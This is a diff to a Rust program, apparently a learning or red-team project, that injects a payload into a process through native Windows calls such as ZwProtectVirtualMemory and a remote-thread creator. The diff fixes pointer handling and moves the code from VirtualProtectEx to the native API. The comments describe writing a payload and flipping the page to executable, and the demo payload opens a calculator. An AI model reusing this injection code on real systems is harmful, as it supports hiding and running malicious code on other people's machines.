@@ -125,12 +125,13 @@ extern "C" {
     
     fn zw_protect_virtual_memory(
         process_handle: HANDLE,             // [in] HANDLE ProcessHandle,
-        base_address: PVoid,           // [in, out] PVOID *BaseAddress,
-        region_size: PUsize,                // [in, out] PSIZE_T RegionSize,
-        new_protection_flags: PAGE_PROTECTION_FLAGS,          // [in] ULONG NewProtect,
-        old_protection_flags: *mut PAGE_PROTECTION_FLAGS      // [out] PULONG OldProtect
+        base_address: *mut PVoid,                // [in, out] PVOID *BaseAddress,
+        region_size:  PUsize,                // [in, out] PSIZE_T RegionSize,
+        proc_flag: usize,   // [in] ULONG NewProtect,
+        flag_old: *mut usize                  // [out] PULONG OldProtect
     ) -> NTSTATUS;
 }
+
 
 fn enumerate_processes() -> Result<Vec<usize>, windows::core::Error> {
     let mut pids: Vec<u32> = vec![0u32; 1024];
@@ -286,40 +287,26 @@ fn nt_create_remote_thread_ex(handle: HANDLE, address: CCvoid) -> Result<(), NTS
     }
 }
 
-fn nt_virtual_protect_ex(handle: HANDLE, address: CCvoid, size: usize, flags: u32){
-    let mut old_flags = PAGE_PROTECTION_FLAGS(0x0);
-    let mut old_flags_ptr = &mut old_flags as *mut PAGE_PROTECTION_FLAGS;
-    let mut address: PVoid = address as PVoid;
-
+fn nt_virtual_protect_ex(handle: HANDLE, address: CCvoid, size: usize, flags: usize) -> Result<CCvoid, NTSTATUS>{
+    let mut old_flags: usize = 0x0;
+    let mut old_flags_ptr = &mut old_flags as *mut usize;
+    let mut address_pointer: PVoid = address as PVoid;
+    let mut size = size;
+    let mut size_pointer = &mut size as PUsize;
     unsafe {
         let status = zw_protect_virtual_memory(
             handle, 
-            address, 
-            size as PUsize, 
-            PAGE_PROTECTION_FLAGS(flags),
+            &mut address_pointer, 
+            size_pointer, 
+            flags,
             old_flags_ptr,
         );
-        println!("NTSTATUS: {:#x}", status.0);
-        dbg!(old_flags);
-
-    }
-
-}
-
-fn virtual_protect_ex(handle: HANDLE, address: CCvoid, size: usize) {
-    let protection_flags = PAGE_PROTECTION_FLAGS(0x10); // Execute.
-    let mut old_protection_flags = PAGE_PROTECTION_FLAGS(0x0);
-    let mut old_protection_flags_ptr = &mut old_protection_flags as *mut PAGE_PROTECTION_FLAGS;
-    unsafe {
-        let status = VirtualProtectEx(
-            handle, 
-            address, 
-            size, 
-            protection_flags, 
-            old_protection_flags_ptr
-        );
-        dbg!(old_protection_flags);
-        dbg!(status);
+        if status.is_ok() { 
+            println!("[+] ProtectVirtualMemory Succeeded");
+            return Ok(address);
+        }
+        eprintln!("[!] ProtectVirtualMemory Failed!\n-> NTSTATUS: {:#x}", status.0);
+        return Err(status)
     }
 }
 
@@ -331,8 +318,6 @@ fn virtual_protect_ex(handle: HANDLE, address: CCvoid, size: usize) {
 // a new block of WRITE space, where it´ll write and drop a payload.
 // Now, after sleeping for 10 seconds, this will turn the page to EXECUTE
 // and start the thread execution. Now, we close the handle(s) and continue our lives.
-
-
 
 fn main() {
     // This opens a calculator
@@ -376,11 +361,10 @@ fn main() {
 
     nt_create_remote_thread_ex(*current_process_handle, addr_space);
     // Sleep to make sure the injection was succesful.
-    use std::{thread, time};
+    /*use std::{thread, time};
     let ten_millis = time::Duration::from_millis(100);
     thread::sleep(ten_millis);
 
-    /*
     let variable_to_read = 100u8;
     let variable_location = &variable_to_read as *const _ as *const c_void;
     let buff = nt_read_process_memory(*current_process_handle, variable_location as usize, 1);
